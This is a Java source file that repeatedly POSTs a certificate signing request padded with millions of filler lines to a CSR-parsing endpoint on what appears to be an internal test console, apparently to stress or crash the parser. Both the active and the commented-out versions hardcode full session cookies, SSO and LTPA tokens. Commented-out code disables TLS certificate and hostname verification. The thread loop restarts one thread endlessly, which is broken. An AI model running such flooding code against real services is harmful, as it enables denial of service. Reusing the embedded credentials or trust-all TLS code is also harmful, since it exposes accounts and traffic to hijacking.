package cn.moonlord;

import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpRequestFactory;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.EntityBuilder;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import sun.misc.BASE64Encoder;

import javax.net.ssl.*;
import java.io.*;
import java.net.*;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.logging.Level;
import java.util.regex.Pattern;

@SpringBootApplication
public class DemoApplication {

    public static void main(String[] args) throws Exception {
        //SpringApplication.run(DemoApplication.class, args);

        //String IP_PATTERN = "(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])";
        //boolean match = Pattern.matches(IP_PATTERN, "0.0.0.0");
        //System.out.println("" + match);
        //System.out.println(URLEncoder.encode("../../../../"));

        /*
        TrustManager[] trustAllCerts = new TrustManager[] {
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) { }
                    public void checkServerTrusted(X509Certificate[] certs, String authType) { }
                }
        };
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HostnameVerifier allHostsValid = new HostnameVerifier(){
            public boolean verify(String hostname, SSLSession session) { return true; }
        };
        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        */

        /*
        InetSocketAddress address = new InetSocketAddress("127.0.0.1",8080);
        Proxy proxy = new Proxy(Proxy.Type.HTTP, address);
        String url = "https://console-test.ulanqab.huawei.com/pca/api_of_scc/pca/v1/pca/certificates/parse-csr";
        HttpURLConnection connection = (HttpURLConnection) (new URL(url)).openConnection(proxy);
        */

        /*
        while(true) {
            String url = "https://console-test.ulanqab.huawei.com/pca/api_of_scc/pca/v1/pca/certificates/parse-csr";
            HttpURLConnection connection = (HttpURLConnection) (new URL(url)).openConnection();

            connection.setRequestMethod("POST");
            connection.setRequestProperty("Cookie", "_ga=GA1.2.522459676.1590717522; lang=zh; iLearningXUserName=l00429783; vk=b2c36078-92af-4db3-84c5-31d4e9d8a88a; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2251-B1-82-D5-27-4D-77-57-AB-0B-C8-DD-30-B2-64-16%22%2C%22%24device_id%22%3A%221725f2626c7540-005309cac63322-376b4502-2073600-1725f2626c8501%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%2C%22first_id%22%3A%221725f2626c7540-005309cac63322-376b4502-2073600-1725f2626c8501%22%7D; JALOR5_LANG=zh_CN; ETHICS_LOGIN_AUTH_SECURE_CODE=3F-9A-62-3E-87-57-59-0F-B1-C5-4A-06-CC-FC-84-A0-7E-ED-D7-27-02-19-54-F5-7E-19-40-4E-00-FC-36-B3-E4-69-64-CA-0A-F5-75-79-42-55-01-17-08-FB-21-5C-BD-B0-89-4D-C4-54-80-37; FORUM_LOGIN_AUTH_SECURE_CODE=3F-9A-62-3E-87-57-59-0F-9A-7C-DB-E4-07-D6-91-37-0E-2F-4F-32-F0-90-89-18-2D-7C-4F-45-46-DF-CC-6E-E4-69-64-CA-0A-F5-75-79-A7-E6-F1-77-98-BD-A8-4B; ua=082c05dc6d00d36f0fa8c01032f6e020; hic_lang=zh_CN; hic_beta_app_id=app_000000035076; SCC_CCM_s00357353_SCC_CCM_s00357353_cfProjectName=cn-north-7; _gid=GA1.2.423145506.1592188132; HW3MS_ResourceLanguage=czowOiIiOw%3D%3D; 2D-4A-29-3E-6C-E6-DF-76-1D-A3-0E-21-2C-88-0E-05=3F-9A-62-3E-87-57-59-0F-9A-7C-DB-E4-07-D6-91-37-B3-65-DD-F5-28-97-15-78-21-ED-F4-E0-69-E8-6E-D6-E4-69-64-CA-0A-F5-75-79-A7-E6-F1-77-98-BD-A8-4B; hwsso_uniportal=\"\"; domain_tag=082c05dc6d00d36f0fa8c01032f6e020; user_tag=082c05dd0980d46e1fd6c01033dd4a54; masked_domain=S********00357353; masked_user=S********00357353; masked_phone=158****6389; usite=cn; popup_max_time=60; x-framework-ob=\"\"; SID=Set2; agencyID=082c05dd0980d46e1fd6c01033dd4a54; third-party-access=\"\"; browserCheckResult=A; ttf=2110105240; ttt=1879927285; SessionID=93d4303f-4599-42a1-8688-cb7f6bf75e6b; ad_ctt=; ad_sc=; ad_mdm=; ad_cmp=; ad_tm=; ad_adp=; cf=Direct; suid=3F-9A-62-3E-87-57-59-0F-DD-80-3A-2E-CE-AA-89-6B; login_uid=3F-9A-62-3E-87-57-59-0F-DD-80-3A-2E-CE-AA-89-6B; hwsso_am=77-22-F7-0E-84-9F-31-CD; login_sip=7E-1A-97-8E-3D-46-19-E3-2A-CF-33-84-34-92-89-11-31-DD-35-52-A5-7C-E0-59; HW3MS_CONNECT_SESSION=rp128kj6pcq561og0aivb76lc6; hwlive_sid=dwAg-1ZVsDZ29fnrparlGh4IejOOyz3x; hwlive_sid.sig=ns0FbICiutr_SZghZ_jmjdAu9l8; businessKey=\"\"; login_recycle=1#1592382132969; protal_terminal=PC; siId=NcS12qYPuQ4o_VAqNVbrTyj; HW3MS_resourceReadedKey=GroupWiki-4871453; hwssotinter3=27130127704376; magot3=27130152323114; hwssot3=27130514244241; hwsso_login=hwWr9kuq2OmwK6mbwM4O6IBxRdbHzfFxRTdeZfTEkulfJhJKARS7tQR8koXaTalQ6c_adkRB2wYA1e4_awY_atgiJfPzr4AQKymEIG0tOTTwraYwBogWMgVYDLzXG5_a1chcS0MuuwcrTKg7RduON7sx43PWnGukdUDI0BWEfFo30ry57NCboHXPOq1G9XethMnAiw7_bt3EfaWe8OmTS6_a76GE1OSf_bVWagbtYgPUsoDZXGbwD20MrUZ1LqfI58FXgkJ0Zkn3n8QakLeLI8jzdFEqacKSo_bEw8f12l74A4f3oG3DA8G0qYGPuqAKGWOJj7IsCad7zuHL9yMGljT8B_b1wuw_c_c; login_logFlag=in; w3Token=3F-9A-62-3E-87-57-59-0F-34-31-C7-7B-27-19-A0-72-DB-A6-1D-25-55-79-D2-34-1D-E3-38-77-78-C7-37-33; _sid_=2F-22-B6-72-F5-9A-5E-02-E3-D2-4A-3F-E5-57-65-6E-6F-24-11-9E-E1-04-66-40-94-34-9C-CB-7B-CF-65-45-2B-C3-0F-2C-33-A2-7F-23; login_sid=2F-22-B6-72-F5-9A-5E-02-E3-D2-4A-3F-E5-57-65-6E-6F-24-11-9E-E1-04-66-40-94-34-9C-CB-7B-CF-65-45-2B-C3-0F-2C-33-A2-7F-23; LtpaToken=xsOHrCTLIAlUVP2XBzryGj7RmkqVXxsnzNMFLll+GTjcaVER8A7HPieNXILfBNV8L2pqMnGJYGUP0zxqRddnGtsA/DVycZE0hKIENKhbS2PuDaoUazvNcxZ1c+eaIRXEy1NIofsD4pdXHEiSv9sdXBcHXJvvODwYxWLjFbmBiywfQvHYp5D/ubK6TyE13q39YjVe5WlK6BD3lV229PAD/qT5iYifVX7jSFem1cYeduk2ZmVmEsq9/UtuQBEfRVAc8AYIYt28LbbXseI1S7M7BQ7vPqx2Q9oUl+ZhlGcxDEufdUQa/qX/YTpNUlCn3tzz/A//GEY7juissOpq8gjzMO8quouiUoiV/4VI0fTyanA3e/LyC9erXQ==; hwssotinter=F3-7D-81-CB-0F-40-98-DB-FE-2E-EA-38-6C-FF-9C-62; hwssot=F3-7D-81-CB-0F-40-98-DB-FE-2E-EA-38-6C-FF-9C-62; locale=zh-cn; __ozlvd1791=1592447379; J_SESSION_ID=9e759d6094cfb75071b9bcc6511c02f77d3d5a7cb8063b01; cftk=K422-ZVTX-UAOR-LHL3-ZCR6-AOZC-Z2KI-AU12; cfLatestRecordTimestamp=1592447554107");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("cftk", "K422-ZVTX-UAOR-LHL3-ZCR6-AOZC-Z2KI-AU12");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36");
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.connect();

            String postData1 = "{\"csr\":\"-----BEGIN NEW CERTIFICATE REQUEST-----\\n";
            String postData2 = "MIICvTCCAaUCAQAwSDEKMAgGA1UEBhMBMTEKMAgGA1UECBMBMTEKMAgGA1UEBxMB\\nMTEKMAgGA1UEChMBMTEKMAgGA1UECxMBMTEKMAgGA1UEAxMBMTCCASIwDQYJKoZI\\nhvcNAQEBBQADggEPADCCAQoCggEBAJJlgqC5TwxqH5uKrDRMNyM9S3xDEsIoo6K3\\nZpuqJK/rSQXwZZn3HQvJmjUDRCnnsnLurMLOPYItDp2lc+nbcOe/zVg3v4qTi2An\\nw9YPkOuVq4luhzJITMApfPtNp9jM/dt0Rwr7eGjdhWNqd6QMUGKuUhPO0ElsDZ8+\\nL55SOF9Byk23ayVR4BcWhor1S1ZcJHKwbSdhVdGA8B1LMb5iAEXWrI/SiwCWRDCD\\nW4qSDf5kvYEHg0V355NNJMEiSUwxdFxNoUhHBj8XIwuK9pNW96e2zLeDM0KubWVt\\nawAh7Yc/eAJV9zTLO1Y3GeWMYe2SH9D6Wwy3HFgJmHyK6Hmo+tkCAwEAAaAwMC4G\\nCSqGSIb3DQEJDjEhMB8wHQYDVR0OBBYEFMPEBnyB9tJ9LRvl12YpQHRadhoEMA0G\\nCSqGSIb3DQEBCwUAA4IBAQBjSAGuy7a5Geu5S7Pdx9QDhQE/N8DhtAOyxVxXCrXJ\\ndBBjp4ueIVTMcF4iH5tFsASs1DmzimvkGah6y9xsGiOZpS3nr0T5P9HoqNVpOkR7\\nMouRIQfpfdwrLV44zqi9Oo49Dm/Hq2/R0PotBjiYscYByOVgTLRAKkseuJtsvUxt\\nh1d36uM7OiEY7w67OEI3ojl0uVGt01YR8p7iSIaNjqRE9jwL2nXK1b2+tCWwO+SC\\n/wZ0YLtHd3q+JEmqGSax6UAxgxE4Tw2abtaGXdLPfHn1DXE17LnrktfYF8nEZZBw\\nnDiC7ehjwBHM7GWI8DgYTh7L2m7vg60vQeoNxq/sWagQ\\n-----END NEW CERTIFICATE REQUEST-----\"}";
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream()));
            out.write(postData1);

            // 长字符串 begin
            //String buffer = (new BASE64Encoder()).encode(String.join("", Collections.nCopies(1024 * 4, "\\t")).getBytes());
            String buffer = String.join("", Collections.nCopies(1024 * 4, "\\t"));
            //System.out.println("buffer : " + buffer);
            long fileSize = 1024 * 4 * (1000 + (new Random()).nextInt(1000)); // (long) Integer.MAX_VALUE * 10;
            for (long i = 0; i < fileSize / buffer.length(); i++) {
                //out.write(buffer);
                out.flush();
            }
            // 长字符串 end

            for (long i = 0; i < 1024 * 4 * 500; i++) {
                out.write(":\\n");
                out.flush();
            }

            out.write(postData2);
            out.flush();
            System.out.println("Cookie : " + connection.getRequestProperty("Cookie"));

            Map<String, List<String>> map = connection.getHeaderFields();
            for (String key : map.keySet()) {
                System.out.println(key + " ---> " + map.get(key));
            }
            int responseCode = connection.getResponseCode();
            System.out.println("responseCode : " + responseCode);

            try {
                String responseContent = "";
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                while ((line = in.readLine()) != null) {
                    responseContent += line + "\r\n";
                }
                System.out.println("responseContent : " + "\r\n" + responseContent);
                connection.disconnect();
            }
            catch (Exception e){}
        }
        */

        {
            String url = "https://console-test.ulanqab.huawei.com/pca/api_of_scc/pca/v1/pca/certificates/parse-csr";
            String postData1 = "{\"csr\":\"-----BEGIN NEW CERTIFICATE REQUEST-----\\n";
            String postData2 = "MIICvTCCAaUCAQAwSDEKMAgGA1UEBhMBMTEKMAgGA1UECBMBMTEKMAgGA1UEBxMB\\nMTEKMAgGA1UEChMBMTEKMAgGA1UECxMBMTEKMAgGA1UEAxMBMTCCASIwDQYJKoZI\\nhvcNAQEBBQADggEPADCCAQoCggEBAJJlgqC5TwxqH5uKrDRMNyM9S3xDEsIoo6K3\\nZpuqJK/rSQXwZZn3HQvJmjUDRCnnsnLurMLOPYItDp2lc+nbcOe/zVg3v4qTi2An\\nw9YPkOuVq4luhzJITMApfPtNp9jM/dt0Rwr7eGjdhWNqd6QMUGKuUhPO0ElsDZ8+\\nL55SOF9Byk23ayVR4BcWhor1S1ZcJHKwbSdhVdGA8B1LMb5iAEXWrI/SiwCWRDCD\\nW4qSDf5kvYEHg0V355NNJMEiSUwxdFxNoUhHBj8XIwuK9pNW96e2zLeDM0KubWVt\\nawAh7Yc/eAJV9zTLO1Y3GeWMYe2SH9D6Wwy3HFgJmHyK6Hmo+tkCAwEAAaAwMC4G\\nCSqGSIb3DQEJDjEhMB8wHQYDVR0OBBYEFMPEBnyB9tJ9LRvl12YpQHRadhoEMA0G\\nCSqGSIb3DQEBCwUAA4IBAQBjSAGuy7a5Geu5S7Pdx9QDhQE/N8DhtAOyxVxXCrXJ\\ndBBjp4ueIVTMcF4iH5tFsASs1DmzimvkGah6y9xsGiOZpS3nr0T5P9HoqNVpOkR7\\nMouRIQfpfdwrLV44zqi9Oo49Dm/Hq2/R0PotBjiYscYByOVgTLRAKkseuJtsvUxt\\nh1d36uM7OiEY7w67OEI3ojl0uVGt01YR8p7iSIaNjqRE9jwL2nXK1b2+tCWwO+SC\\n/wZ0YLtHd3q+JEmqGSax6UAxgxE4Tw2abtaGXdLPfHn1DXE17LnrktfYF8nEZZBw\\nnDiC7ehjwBHM7GWI8DgYTh7L2m7vg60vQeoNxq/sWagQ\\n-----END NEW CERTIFICATE REQUEST-----\"}";
            String buffer = String.join("", Collections.nCopies(1024 * 4 * 512, ":\\n"));
            String postData = postData1 + "\\n" + buffer + "\\n" + postData2;

            final HttpPost post = new HttpPost(url);
            post.setHeader("Cookie", "_ga=GA1.2.522459676.1590717522; lang=zh; iLearningXUserName=l00429783; vk=b2c36078-92af-4db3-84c5-31d4e9d8a88a; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2251-B1-82-D5-27-4D-77-57-AB-0B-C8-DD-30-B2-64-16%22%2C%22%24device_id%22%3A%221725f2626c7540-005309cac63322-376b4502-2073600-1725f2626c8501%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%2C%22first_id%22%3A%221725f2626c7540-005309cac63322-376b4502-2073600-1725f2626c8501%22%7D; JALOR5_LANG=zh_CN; ETHICS_LOGIN_AUTH_SECURE_CODE=3F-9A-62-3E-87-57-59-0F-B1-C5-4A-06-CC-FC-84-A0-7E-ED-D7-27-02-19-54-F5-7E-19-40-4E-00-FC-36-B3-E4-69-64-CA-0A-F5-75-79-42-55-01-17-08-FB-21-5C-BD-B0-89-4D-C4-54-80-37; FORUM_LOGIN_AUTH_SECURE_CODE=3F-9A-62-3E-87-57-59-0F-9A-7C-DB-E4-07-D6-91-37-0E-2F-4F-32-F0-90-89-18-2D-7C-4F-45-46-DF-CC-6E-E4-69-64-CA-0A-F5-75-79-A7-E6-F1-77-98-BD-A8-4B; ua=082c05dc6d00d36f0fa8c01032f6e020; hic_lang=zh_CN; hic_beta_app_id=app_000000035076; SCC_CCM_s00357353_SCC_CCM_s00357353_cfProjectName=cn-north-7; _gid=GA1.2.423145506.1592188132; HW3MS_ResourceLanguage=czowOiIiOw%3D%3D; 2D-4A-29-3E-6C-E6-DF-76-1D-A3-0E-21-2C-88-0E-05=3F-9A-62-3E-87-57-59-0F-9A-7C-DB-E4-07-D6-91-37-B3-65-DD-F5-28-97-15-78-21-ED-F4-E0-69-E8-6E-D6-E4-69-64-CA-0A-F5-75-79-A7-E6-F1-77-98-BD-A8-4B; hwsso_uniportal=\"\"; domain_tag=082c05dc6d00d36f0fa8c01032f6e020; user_tag=082c05dd0980d46e1fd6c01033dd4a54; masked_domain=S********00357353; masked_user=S********00357353; masked_phone=158****6389; usite=cn; popup_max_time=60; x-framework-ob=\"\"; SID=Set2; agencyID=082c05dd0980d46e1fd6c01033dd4a54; third-party-access=\"\"; browserCheckResult=A; ttf=2110105240; ttt=1879927285; SessionID=93d4303f-4599-42a1-8688-cb7f6bf75e6b; ad_ctt=; ad_sc=; ad_mdm=; ad_cmp=; ad_tm=; ad_adp=; cf=Direct; suid=3F-9A-62-3E-87-57-59-0F-DD-80-3A-2E-CE-AA-89-6B; login_uid=3F-9A-62-3E-87-57-59-0F-DD-80-3A-2E-CE-AA-89-6B; hwsso_am=77-22-F7-0E-84-9F-31-CD; login_sip=7E-1A-97-8E-3D-46-19-E3-2A-CF-33-84-34-92-89-11-31-DD-35-52-A5-7C-E0-59; HW3MS_CONNECT_SESSION=rp128kj6pcq561og0aivb76lc6; hwlive_sid=dwAg-1ZVsDZ29fnrparlGh4IejOOyz3x; hwlive_sid.sig=ns0FbICiutr_SZghZ_jmjdAu9l8; businessKey=\"\"; login_recycle=1#1592382132969; protal_terminal=PC; siId=NcS12qYPuQ4o_VAqNVbrTyj; HW3MS_resourceReadedKey=GroupWiki-4871453; hwssotinter3=27130127704376; magot3=27130152323114; hwssot3=27130514244241; hwsso_login=hwWr9kuq2OmwK6mbwM4O6IBxRdbHzfFxRTdeZfTEkulfJhJKARS7tQR8koXaTalQ6c_adkRB2wYA1e4_awY_atgiJfPzr4AQKymEIG0tOTTwraYwBogWMgVYDLzXG5_a1chcS0MuuwcrTKg7RduON7sx43PWnGukdUDI0BWEfFo30ry57NCboHXPOq1G9XethMnAiw7_bt3EfaWe8OmTS6_a76GE1OSf_bVWagbtYgPUsoDZXGbwD20MrUZ1LqfI58FXgkJ0Zkn3n8QakLeLI8jzdFEqacKSo_bEw8f12l74A4f3oG3DA8G0qYGPuqAKGWOJj7IsCad7zuHL9yMGljT8B_b1wuw_c_c; login_logFlag=in; w3Token=3F-9A-62-3E-87-57-59-0F-34-31-C7-7B-27-19-A0-72-DB-A6-1D-25-55-79-D2-34-1D-E3-38-77-78-C7-37-33; _sid_=2F-22-B6-72-F5-9A-5E-02-E3-D2-4A-3F-E5-57-65-6E-6F-24-11-9E-E1-04-66-40-94-34-9C-CB-7B-CF-65-45-2B-C3-0F-2C-33-A2-7F-23; login_sid=2F-22-B6-72-F5-9A-5E-02-E3-D2-4A-3F-E5-57-65-6E-6F-24-11-9E-E1-04-66-40-94-34-9C-CB-7B-CF-65-45-2B-C3-0F-2C-33-A2-7F-23; LtpaToken=xsOHrCTLIAlUVP2XBzryGj7RmkqVXxsnzNMFLll+GTjcaVER8A7HPieNXILfBNV8L2pqMnGJYGUP0zxqRddnGtsA/DVycZE0hKIENKhbS2PuDaoUazvNcxZ1c+eaIRXEy1NIofsD4pdXHEiSv9sdXBcHXJvvODwYxWLjFbmBiywfQvHYp5D/ubK6TyE13q39YjVe5WlK6BD3lV229PAD/qT5iYifVX7jSFem1cYeduk2ZmVmEsq9/UtuQBEfRVAc8AYIYt28LbbXseI1S7M7BQ7vPqx2Q9oUl+ZhlGcxDEufdUQa/qX/YTpNUlCn3tzz/A//GEY7juissOpq8gjzMO8quouiUoiV/4VI0fTyanA3e/LyC9erXQ==; hwssotinter=F3-7D-81-CB-0F-40-98-DB-FE-2E-EA-38-6C-FF-9C-62; hwssot=F3-7D-81-CB-0F-40-98-DB-FE-2E-EA-38-6C-FF-9C-62; locale=zh-cn; __ozlvd1791=1592447379; J_SESSION_ID=9e759d6094cfb75071b9bcc6511c02f77d3d5a7cb8063b01; cftk=K422-ZVTX-UAOR-LHL3-ZCR6-AOZC-Z2KI-AU12; cfLatestRecordTimestamp=1592447554107");
            post.setHeader("Content-Type", "application/json; charset=UTF-8");
            post.setHeader("cftk", "K422-ZVTX-UAOR-LHL3-ZCR6-AOZC-Z2KI-AU12");
            post.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36");
            HttpEntity entity = EntityBuilder.create().setText(postData).build();
            post.setEntity(entity);

            Runnable run = new Runnable() {
                @Override
                public void run() {
                    HttpClient client = HttpClients.createMinimal();
                    while(true) {
                        try{
                            HttpResponse response = client.execute(post);
                            Integer responseCode = response.getStatusLine().getStatusCode();

                            BufferedReader in = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
                            String responseContent = "";
                            String line;
                            while ((line = in.readLine()) != null) {
                                responseContent += line + "\r\n";
                            }
                            System.out.println("responseCode : " + responseCode);
                            System.out.println("responseContent : " + "\r\n" + responseContent);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            };
            for (int i = 0; i < 1; i++) {
                Thread thread = new Thread(run);
                while(true) {
                    thread.start();
                }
            }
        }
    }
}
